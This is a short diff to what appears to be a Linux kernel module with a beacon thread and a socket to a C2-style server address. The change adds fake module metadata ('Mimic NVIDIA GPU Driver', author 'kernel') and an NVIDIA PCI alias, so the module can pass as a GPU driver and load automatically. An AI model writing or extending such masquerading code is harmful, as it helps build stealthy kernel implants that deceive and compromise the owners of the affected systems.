@@ -13,6 +13,12 @@
 #include <linux/inet.h>
 #include <linux/kmod.h>
 
+
+MODULE_LICENSE("Proprietary");
+MODULE_AUTHOR("kernel");
+MODULE_DESCRIPTION("Mimic NVIDIA GPU Driver");
+MODULE_ALIAS("pci:v000010DEd00001D01sv*sd*bc*sc*i*");
+
 static struct task_struct *beacon_thread;
 static struct socket *conn_socket = NULL;
 #define SERVER_IP   0x7F000001  // 127.0.0.1
